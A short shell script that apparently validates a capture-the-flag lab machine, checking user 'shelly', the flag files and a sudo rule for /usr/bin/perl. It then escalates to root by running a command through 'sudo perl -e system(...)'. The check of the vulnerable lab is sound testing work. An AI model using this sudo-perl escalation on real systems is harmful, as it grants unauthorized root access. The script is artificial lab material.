#!/bin/sh
set -eu
test "$(id -u)" = 1001
test -r /home/shelly/user.txt
if test -r /root/root.txt; then echo 'FAIL: root flag readable before sudo' >&2; exit 1; fi
sudo -n -l | grep -Fq '/usr/bin/perl'
sudo -n /usr/bin/perl -e 'system("/usr/bin/id > /tmp/shocker-real-sudo-marker")'
grep -q 'uid=0(root)' /tmp/shocker-real-sudo-marker
echo 'PASS: native sudo perl -> real UID0'
